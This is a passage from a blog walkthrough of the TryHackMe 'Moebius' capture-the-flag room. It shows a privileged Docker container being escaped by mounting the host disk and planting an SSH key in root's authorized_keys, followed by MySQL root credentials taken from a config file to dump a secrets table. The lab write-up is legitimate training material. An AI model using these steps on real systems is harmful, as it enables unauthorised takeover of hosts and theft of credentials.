</span></pre></table></code></div></div><p>Escalating to <code class="language-plaintext highlighter-rouge">root</code> inside the container:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">www-data@bb28d5969dd5:/var/www/html$</span><span class="w"> </span><span class="nb">sudo </span>su -
<span class="gp">root@bb28d5969dd5:~#</span><span class="w"> </span><span class="nb">id</span>
<span class="go">uid=0(root) gid=0(root) groups=0(root)
</span></pre></table></code></div></div><p>Next, we inspect the effective capabilities of the container:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">root@bb28d5969dd5:~#</span><span class="w"> </span><span class="nb">grep </span>CapEff /proc/self/status
<span class="go">CapEff: 000001ffffffffff
</span></pre></table></code></div></div><p>Decoding this value confirms the container holds many capabilities:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>capsh <span class="nt">--decode</span><span class="o">=</span>000001ffffffffff
<span class="go">0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
</span></pre></table></code></div></div><p>With these capabilities, there are many ways to escape the container. However, one of the simplest methods would be to mount the host’s root filesystem since we have direct access to the host’s block devices:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">root@bb28d5969dd5:~#</span><span class="w"> </span>mount /dev/nvme0n1p1 /mnt
<span class="gp">root@bb28d5969dd5:~#</span><span class="w"> </span><span class="nb">cat</span> /mnt/etc/hostname
<span class="go">ubuntu-jammy
</span></pre></table></code></div></div><p>To convert this filesystem access into a shell, we can add an SSH public key to the host’s <code class="language-plaintext highlighter-rouge">/root/.ssh/authorized_keys</code>. First, generating a key pair:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>ssh-keygen <span class="nt">-f</span> id_ed25519 <span class="nt">-t</span> ed25519
<span class="c">...
</span><span class="gp">$</span><span class="w"> </span><span class="nb">cat </span>id_ed25519.pub
<span class="go">ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB0nYk5JDOsXnmkB8tQOOspf8I5Ubr2sBLtnXUFq4RMP kali@kali
</span></pre></table></code></div></div><p>Writing the public key to <code class="language-plaintext highlighter-rouge">/mnt/root/.ssh/authorized_keys</code> (<code class="language-plaintext highlighter-rouge">/root/.ssh/authorized_keys</code> on the host):</p><div class="language-console wrap highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">root@bb28d5969dd5:~#</span><span class="w"> </span><span class="nb">echo</span> <span class="s1">'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB0nYk5JDOsXnmkB8tQOOspf8I5Ubr2sBLtnXUFq4RMP kali@kali'</span> <span class="o">&gt;&gt;</span> /mnt/root/.ssh/authorized_keys
</pre></table></code></div></div><p>Now, we can use the private key with SSH to get a shell as the <code class="language-plaintext highlighter-rouge">root</code> user on the host and read the user flag at <code class="language-plaintext highlighter-rouge">/root/user.txt</code>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>ssh <span class="nt">-i</span> id_ed25519 root@10.10.152.169
<span class="go">
</span><span class="gp">root@ubuntu-jammy:~#</span><span class="w"> </span><span class="nb">id</span>
<span class="go">uid=0(root) gid=0(root) groups=0(root)
</span><span class="gp">root@ubuntu-jammy:~#</span><span class="w"> </span><span class="nb">wc</span> <span class="nt">-c</span> /root/user.txt
<span class="go">38 /root/user.txt
</span></pre></table></code></div></div><h2 id="root-flag"><span class="me-2">Root Flag</span><a href="#root-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="mysql-database"><span class="me-2">MySQL Database</span><a href="#mysql-database" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>From the <code class="language-plaintext highlighter-rouge">dbconfig.php</code> file, we already knew that the database was running on another host (<code class="language-plaintext highlighter-rouge">db</code>). Checking the <code class="language-plaintext highlighter-rouge">docker-compose.yml</code> at <code class="language-plaintext highlighter-rouge">/root/challenge/docker-compose.yml</code>, we can see it is another container:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="gp">root@ubuntu-jammy:~/challenge#</span><span class="w"> </span><span class="nb">cat </span>docker-compose.yml<span class="p">;</span> <span class="nb">echo</span>
<span class="go">version: '3'

services:
  web:
    platform: linux/amd64
    build: ./web
    ports:
      - "80:80"
    restart: always
    privileged: true
  db:
    image: mariadb:10.11.11-jammy
    volumes:
      - "./db:/docker-entrypoint-initdb.d:ro"
    env_file:
      - ./db/db.env
    restart: always
</span></pre></table></code></div></div><p>From the <code class="language-plaintext highlighter-rouge">/root/challenge/db/db.env</code> file, we can get the <code class="language-plaintext highlighter-rouge">root</code> password for the <strong>MySQL</strong> server:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="gp">root@ubuntu-jammy:~/challenge#</span><span class="w"> </span><span class="nb">cat </span>db/db.env<span class="p">;</span> <span class="nb">echo</span>
<span class="go">MYSQL_PASSWORD=TAJnF6YuIot83X3g
MYSQL_DATABASE=web
MYSQL_USER=web
MYSQL_ROOT_PASSWORD=gG4i8NFNkcHBwUpd
</span></pre></table></code></div></div><p>Listing the running containers, we can find the container running the database:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="gp">root@ubuntu-jammy:~/challenge#</span><span class="w"> </span>docker container <span class="nb">ls</span>
<span class="go">CONTAINER ID   IMAGE                    COMMAND                  CREATED       STATUS       PORTS                                 NAMES
89366d62e05c   mariadb:10.11.11-jammy   "docker-entrypoint.s…"   7 weeks ago   Up 4 hours   3306/tcp                              challenge-db-1
</span><span class="gp">bb28d5969dd5   challenge-web            "docker-php-entrypoi…"   7 weeks ago   Up 4 hours   0.0.0.0:80-&gt;</span>80/tcp, <span class="o">[</span>::]:80-&gt;80/tcp   challenge-web-1
</pre></table></code></div></div><p>We can get a shell inside the database container as follows:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">root@ubuntu-jammy:~/challenge#</span><span class="w"> </span>docker container <span class="nb">exec</span> <span class="nt">-it</span> 8936 bash
</pre></table></code></div></div><p>Connecting to the database with the password we discovered in the <code class="language-plaintext highlighter-rouge">db.env</code> file and checking the databases, we can see that, apart from the <code class="language-plaintext highlighter-rouge">web</code> database we already had access to, we have access to one more database: <code class="language-plaintext highlighter-rouge">secret</code>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="gp">root@89366d62e05c:/#</span><span class="w"> </span>mysql <span class="nt">-u</span> root <span class="nt">-pgG4i8NFNkcHBwUpd</span>
<span class="gp">MariaDB [(none)]&gt;</span><span class="w"> </span>show databases<span class="p">;</span>
<span class="go">+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| secret             |
| sys                |
| web                |
+--------------------+
6 rows in set (0.004 sec)
</span></pre></table></code></div></div><p>Checking the tables for the <code class="language-plaintext highlighter-rouge">secret</code> database, there is one table: <code class="language-plaintext highlighter-rouge">secrets</code>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="gp">MariaDB [(none)]&gt;</span><span class="w"> </span>use secret<span class="p">;</span>
<span class="gp">MariaDB [secret]&gt;</span><span class="w"> </span>show tables<span class="p">;</span>
<span class="go">+------------------+
| Tables_in_secret |
+------------------+
| secrets          |
+------------------+
1 row in set (0.000 sec)
</span></pre></table></code></div></div><p>Finally, fetching everything from the <code class="language-plaintext highlighter-rouge">secrets</code> table, we can discover the root flag and complete the room.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>MariaDB [secret]&gt; select * from secrets;
+---------------------------------------+
| flag                                  |
+---------------------------------------+
| THM{[REDACTED]}                       |
+---------------------------------------+
1 row in set (0.000 sec)
</pre></table></code></div></div><style> .center img { display:block; margin-left:auto; margin-right:auto; } .wrap pre{ white-space: pre-wrap; }</style></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="/categories/tryhackme/">TryHackMe</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a> <a href="/tags/sqli/" class="post-tag no-text-decoration" >sqli</a> <a href="/tags/sqlmap/" class="post-tag no-text-decoration" >sqlmap</a> <a href="/tags/lfi/" class="post-tag no-text-decoration" >lfi</a> <a href="/tags/php/" class="post-tag no-text-decoration" >php</a> <a href="/tags/filters-chain/" class="post-tag no-text-decoration" >filters chain</a> <a href="/tags/ld-preload/" class="post-tag no-text-decoration" >ld_preload</a> <a href="/tags/docker/" class="post-tag no-text-decoration" >docker</a> <a href="/tags/mysql/" class="post-tag no-text-decoration" >mysql</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=TryHackMe:%20Moebius%20-%20jaxafed&url=https%3A%2F%2Fjaxafed.github.io%2Fposts%2Ftryhackme-moebius%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fa-brands fa-square-x-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=TryHackMe:%20Moebius%20-%20jaxafed&u=https%3A%2F%2Fjaxafed.github.io%2Fposts%2Ftryhackme-moebius%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fjaxafed.github.io%2Fposts%2Ftryhackme-moebius%2F&text=TryHackMe:%20Moebius%20-%20jaxafed" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/posts/tryhackme-ledger/">TryHackMe: Ledger</a><li class="text-truncate lh-lg"> <a href="/posts/tryhackme-moebius/">TryHackMe: Moebius</a><li class="text-truncate lh-lg"> <a href="/posts/tryhackme-robots/">TryHackMe: Robots</a><li class="text-truncate lh-lg"> <a href="/posts/tryhackme-billing/">TryHackMe: Billing</a><li class="text-truncate lh-lg"> <a href="/posts/tryhackme-crypto_failures/">TryHackMe: Crypto Failures</a></ul></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/web/">web</a> <a class="post-tag btn btn-outline-primary" href="/tags/python/">python</a> <a class="post-tag btn btn-outline-primary" href="/tags/rce/">rce</a> <a class="post-tag btn btn-outline-primary" href="/tags/sudo/">sudo</a> <a class="post-tag btn btn-outline-primary" href="/tags/ffuf/">ffuf</a> <a class="post-tag btn btn-outline-primary" href="/tags/php/">php</a> <a class="post-tag btn btn-outline-primary" href="/tags/brute-force/">brute-force</a> <a class="post-tag btn btn-outline-primary" href="/tags/windows/">windows</a> <a class="post-tag btn btn-outline-primary" href="/tags/ssh/">ssh</a> <a class="post-tag btn btn-outline-primary" href="/tags/vhost/">vhost</a></div></section></div><div class="toc-border-cover z-3"></div><section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4"><h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2><nav id="toc"></nav></section></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/posts/tryhackme-robots/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1742158800" data-df="ll" > Mar 17, 2025 </time><h4 class="pt-0 my-2">TryHackMe: Robots</h4><div class="text-muted"><p>Robots started with basic enumeration of a web application to discover an endpoint with register and login functionalities. Using an XSS vulnerability in the username field of registered accounts, ...</p></div></div></a></article><article class="col"> <a href="/posts/tryhackme-smol/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1737752400" data-df="ll" > Jan 25, 2025 </time><h4 class="pt-0 my-2">TryHackMe: Smol</h4><div class="text-muted"><p>Smol started by enumerating a WordPress instance to discover a plugin with a file disclosure vulnerability. This vulnerability allowed us to identify a backdoor in another plugin, which we then exp...</p></div></div></a></article><article class="col"> <a href="/posts/tryhackme-kitty/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1707080400" data-df="ll" > Feb 5, 2024 </time><h4 class="pt-0 my-2">TryHackMe: Kitty</h4><div class="text-muted"><p>Kitty started by discovering a SQL injection vulnerability with a simple filter in place. Bypassing the filter, we were able to dump the database and get some credentials. Using these credentials f...</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/posts/tryhackme-robots/" class="btn btn-outline-primary" aria-label="Older" ><p>TryHackMe: Robots</p></a> <a href="/posts/tryhackme-ledger/" class="btn btn-outline-primary" aria-label="Newer" ><p>TryHackMe: Ledger</p></a></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>© <time>2025</time> <a href="https://twitter.com/jaxafed">jaxafed</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>Using the <a data-bs-toggle="tooltip" data-bs-placement="top" title="v7.2.4" href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener" >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/web/">web</a> <a class="post-tag btn btn-outline-primary" href="/tags/python/">python</a> <a class="post-tag btn btn-outline-primary" href="/tags/rce/">rce</a> <a class="post-tag btn btn-outline-primary" href="/tags/sudo/">sudo</a> <a class="post-tag btn btn-outline-primary" href="/tags/ffuf/">ffuf</a> <a class="post-tag btn btn-outline-primary" href="/tags/php/">php</a> <a class="post-tag btn btn-outline-primary" href="/tags/brute-force/">brute-force</a> <a class="post-tag btn btn-outline-primary" href="/tags/windows/">windows</a> <a class="post-tag btn btn-outline-primary" href="/tags/ssh/">ssh</a> <a class="post-tag btn btn-outline-primary" href="/tags/vhost/">vhost</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div><aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></aside><script> document.addEventListener('DOMContentLoaded', () => { SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{snippet}</p></article>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); }); </script>



